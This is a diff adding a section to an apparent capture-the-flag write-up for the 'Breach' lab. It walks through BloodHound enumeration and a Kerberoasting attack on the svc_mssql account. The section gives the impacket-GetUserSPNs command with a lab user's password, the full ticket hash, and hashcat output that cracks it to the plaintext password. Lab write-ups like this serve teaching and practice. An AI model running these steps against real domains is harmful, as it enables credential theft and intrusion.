@@ -1045,3 +1045,54 @@ smb: \transfer\julia.wong\> exit
 55d33e....
 ```
 
+I'll move on to bloodhound now.
+
+### Bloodhound
+
+Looking at julia.wong profile, she doesn't have any interesting outbound permissions. I'll mark her as owned and enumerate the rest of the Active Directory environment.
+
+<p align="center">
+  <a href="/assets/images/breach/Captura2.png" class="glightbox">
+    <img src="/assets/images/breach/Captura2.png" width="700">
+  </a>
+</p>
+
+We'll go to the `"Analysis"` tab to use the pre-made queries in Bloodhound. A very interesting one is the Kerberoastable accounts.
+
+<p align="center">
+  <a href="/assets/images/breach/Captura3.png" class="glightbox">
+    <img src="/assets/images/breach/Captura3.png" width="700">
+  </a>
+</p>
+
+This shows us svc_mssql has a SPN set, meaning it might be vulnerable to a kerberoast attack. To try and exploit this, we have a lot of options out there, using nxc or imapcket tools is always my go to.
+
+This time, I'll use impacket.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach/bh]
+└─$ impacket-GetUserSPNs breach.vl/julia.wong:'Computer1' -dc-ip 10.129.8.90 -request 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
+--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106169  2026-02-25 11:26:17.783432             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$0a0859eb586316d1878faa9e527e5320$1a3e60a909843cedcc0052dbafb380bbad1379e20af878a4a88c4ce6e1872b78f2b271153496f2458ebdf6494efcfb294cf01dcd5902c97a899c065634c0e3775472e4cacfa6aefe7b3b7aaaf569f78a55582a19d67ffc105385565131cdd157da44dc73e933fdbcbc483111dfa3cef67298292e2d9802b31fdc28b947cdfcf04e54b341391a9e07686fc21f98a2d59a4549025955e18e7d8b8ab67a8248f2beb6102c078921a93ca6b3f87195470dd98844555af9a2297de384a81e8121db5891328857008680797661e1b0847d7aa2b0e1d0dfca210510edf27a0ece640f60e6d0af0e71ca7d5630359bb2023a87f9e3c0a3f5bcec2b977029a7652e6acfa97c5e87da1b09890ce4030823247f7863eec5d44360a036abe7b2efd0e0bacbec627ca07aa2a016b7d523e8542d16f1178ae3cdf29e5a9050bfcaa6998b9df1a602ca364844cea68308e3c4422670d97ffbf4df8261b7c036d32100ba76a38691290229659ed861da73dd9b7348131b3315c012c0978ff9e9fb387ee063721848996ed1dd9f3ac7e42bdb7c963f73409525bbfecc0a83cfd3d929740bb9b60ad8eb020ecef8d2958f5aeaf10ccd19a6b0d76959283698e964f95671b5073ff8b206ba2e56b61a8da3d3ed1427b50bb0d8990d8856c7af02ea2d9cf5ef0702f159e005b722aec74eea05924268ab60db0083d25c0f28ace9b4f16665bca3b6fc8f79ccfec8d0a2c3b19ac3cd1946ffa9c791cdb007b53d9fdc886d8ac5538832773e81b74f74a1b7d3018e4e9cc3b96bdd29340edab20f5f3f61b15ed2ea103a28eb5fdc0122e0b53c512976c3f33d0f5021812a8b2c165674c9d58a72df2985ff37eb53b52394adfbf9604eeb33f29bf6b074dd5dd8ef2ab499fb1fb1ecb8e167eb8e121f4aada0bb61abd0f08a3c09ef626fc5c93020671afbf8c0391bc9de95d227e75ad3d68d8779ff8bb65c9ad47a3936d08f7e55ef6e426ec119d2f0a10fa46b6e074433d742d058305a0446585b5b0ea08e7d25a67be43dc97656511da1cd8dbdc2a86d334c8368debfa2102e75723121a3ce18530014f1ecbe720dd91bc561ab0cffcae09b676641d6e6ade9099b816639773be7b3b32fdeb4ee6581d14059fef1161ca9a8c389e0271ed274f16457a3cd813be10f700427e51a1433a84d406b1e7a782b8c3bf540586d6d05ee7a1075cc34ef18711b1fb53b2572ee0bcfd85104baad5bc1d7c39c0dab2eea4671ccd869629ddef179e1ca8cec6f2599275a70c3b7ecdcf449b8c2bfff56ac26507c97784bd65d94c6f39a8da8cd4e11aba95d344566ff1eb2f944eda8b082f74f7a62bc8a463d6c13adb69f7378495847d489b99abe8c39e967f98e7a3890426a72a8aa66ae018a971137d8383ee53469c07d614f02e4acf7b407ce50143a4c114a17207a29fb9aee14267c662e6442822e3d29873bfb98395551f46ee2d23267412057
+```
+
+I'll copy the hash and try to crack it offline.
+
+```powershell
+Dictionary cache hit:
+* Filename..: .\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$0a0859eb586316d1878faa9e527e5320$1a3e60a909843cedcc0052dbafb380bbad1379e20af878a4a88c4ce6e1872b78f2b271153496f2458ebdf6494efcfb294cf01dcd5902c97a899c065634c0e3775472e4cacfa6aefe7b3b7aaaf569f78a55582a19d67ffc105385565131cdd157da44dc73e933fdbcbc483111dfa3cef67298292e2d9802b31fdc28b947cdfcf04e54b341391a9e07686fc21f98a2d59a4549025955e18e7d8b8ab67a8248f2beb6102c078921a93ca6b3f87195470dd98844555af9a2297de384a81e8121db5891328857008680797661e1b0847d7aa2b0e1d0dfca210510edf27a0ece640f60e6d0af0e71ca7d5630359bb2023a87f9e3c0a3f5bcec2b977029a7652e6acfa97c5e87da1b09890ce4030823247f7863eec5d44360a036abe7b2efd0e0bacbec627ca07aa2a016b7d523e8542d16f1178ae3cdf29e5a9050bfcaa6998b9df1a602ca364844cea68308e3c4422670d97ffbf4df8261b7c036d32100ba76a38691290229659ed861da73dd9b7348131b3315c012c0978ff9e9fb387ee063721848996ed1dd9f3ac7e42bdb7c963f73409525bbfecc0a83cfd3d929740bb9b60ad8eb020ecef8d2958f5aeaf10ccd19a6b0d76959283698e964f95671b5073ff8b206ba2e56b61a8da3d3ed1427b50bb0d8990d8856c7af02ea2d9cf5ef0702f159e005b722aec74eea05924268ab60db0083d25c0f28ace9b4f16665bca3b6fc8f79ccfec8d0a2c3b19ac3cd1946ffa9c791cdb007b53d9fdc886d8ac5538832773e81b74f74a1b7d3018e4e9cc3b96bdd29340edab20f5f3f61b15ed2ea103a28eb5fdc0122e0b53c512976c3f33d0f5021812a8b2c165674c9d58a72df2985ff37eb53b52394adfbf9604eeb33f29bf6b074dd5dd8ef2ab499fb1fb1ecb8e167eb8e121f4aada0bb61abd0f08a3c09ef626fc5c93020671afbf8c0391bc9de95d227e75ad3d68d8779ff8bb65c9ad47a3936d08f7e55ef6e426ec119d2f0a10fa46b6e074433d742d058305a0446585b5b0ea08e7d25a67be43dc97656511da1cd8dbdc2a86d334c8368debfa2102e75723121a3ce18530014f1ecbe720dd91bc561ab0cffcae09b676641d6e6ade9099b816639773be7b3b32fdeb4ee6581d14059fef1161ca9a8c389e0271ed274f16457a3cd813be10f700427e51a1433a84d406b1e7a782b8c3bf540586d6d05ee7a1075cc34ef18711b1fb53b2572ee0bcfd85104baad5bc1d7c39c0dab2eea4671ccd869629ddef179e1ca8cec6f2599275a70c3b7ecdcf449b8c2bfff56ac26507c97784bd65d94c6f39a8da8cd4e11aba95d344566ff1eb2f944eda8b082f74f7a62bc8a463d6c13adb69f7378495847d489b99abe8c39e967f98e7a3890426a72a8aa66ae018a971137d8383ee53469c07d614f02e4acf7b407ce50143a4c114a17207a29fb9aee14267c662e6442822e3d29873bfb98395551f46ee2d23267412057:Trustno1
+```
+
